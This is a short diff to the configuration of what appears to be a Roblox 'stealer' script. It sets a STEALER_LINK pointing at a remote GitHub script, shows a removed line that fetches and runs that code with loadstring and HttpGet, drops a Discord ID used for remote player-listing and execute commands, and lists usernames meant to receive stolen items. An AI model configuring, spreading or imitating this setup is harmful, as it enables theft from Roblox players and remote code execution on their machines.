@@ -1,6 +1,4 @@
-STEALER_LINK = 'loadstring(game:HttpGet(https://raw.githubusercontent.com/Fluxusoffcial2/mateorisz/refs/heads/main/script, true))()' -- stealer link (how to create is bellow)
-
-DISCORD_ID = '1234567' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
+STEALER_LINK = 'https://raw.githubusercontent.com/Fluxusoffcial2/Mateorizs/refs/heads/main/Script' -- stealer link (how to create is bellow)
 
 Usernames = {
     'kikoshuriko123', -- PUT UR ROBLOX USERNAMES
